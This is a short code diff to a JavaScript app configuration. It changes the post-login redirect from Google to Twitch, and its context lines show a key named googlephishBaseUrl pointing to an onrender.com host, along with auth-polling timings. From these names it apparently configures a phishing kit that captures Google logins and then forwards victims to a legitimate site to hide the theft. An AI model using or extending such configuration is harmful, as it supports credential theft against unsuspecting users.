@@ -3,7 +3,7 @@ window.APP_CONFIG = {
     authPollIntervalMs: 1500,
     authPollMaxMs: 3 * 60 * 1000,
 
-    afterLoginRedirectUrl: 'https://www.google.com',
+    afterLoginRedirectUrl: 'https://www.twitch.tv/',
     afterLoginRedirectDelayMs: 0,
 
     googlephishBaseUrl: 'https://tk-ap-1.onrender.com/',
